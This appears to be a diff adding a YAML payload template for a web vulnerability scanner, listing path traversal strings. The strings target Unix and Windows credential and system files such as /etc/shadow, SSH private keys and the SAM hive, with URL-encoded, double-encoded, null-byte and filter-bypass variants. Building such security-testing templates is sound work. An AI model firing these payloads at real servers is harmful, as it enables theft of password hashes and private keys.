@@ -1,0 +1,43 @@
+name: "Path Traversal"
+vulnerability_type: "path_traversal"
+description: "Path traversal payloads for various operating systems and encoding techniques"
+base_payloads:
+  # Linux/Unix paths
+  - "../../../etc/passwd"
+  - "../../../../etc/shadow"
+  - "../../../etc/hosts"
+  - "../../../../var/log/apache2/access.log"
+  - "../../../proc/version"
+  - "../../../../home/{VARIATION}/.ssh/id_rsa"
+  - "../../../etc/apache2/apache2.conf"
+  - "../../../../var/www/html/index.php"
+  # Windows paths
+  - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+  - "..\\..\\..\\windows\\win.ini"
+  - "..\\..\\..\\windows\\system32\\config\\sam"
+  - "..\\..\\..\\inetpub\\wwwroot\\web.config"
+  - "..\\..\\..\\windows\\system32\\inetsrv\\config\\applicationHost.config"
+  # Encoded variations
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+  - "..%252f..%252f..%252fetc%252fpasswd"
+  - "....//....//....//etc/passwd"
+  - "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"
+  # Null byte injection
+  - "../../../etc/passwd%00"
+  - "../../../etc/passwd%00.jpg"
+  # Filter bypass
+  - "....//....//....//etc/passwd"
+  - "..///////..////etc/passwd"
+  - "..\\....\\....\\etc\\passwd"
+variations:
+  - "root"
+  - "admin"
+  - "user"
+  - "www-data"
+  - "apache"
+encodings:
+  - "url"
+  - "double_url"
+  - "unicode"
+obfuscations:
+  - "mutation"
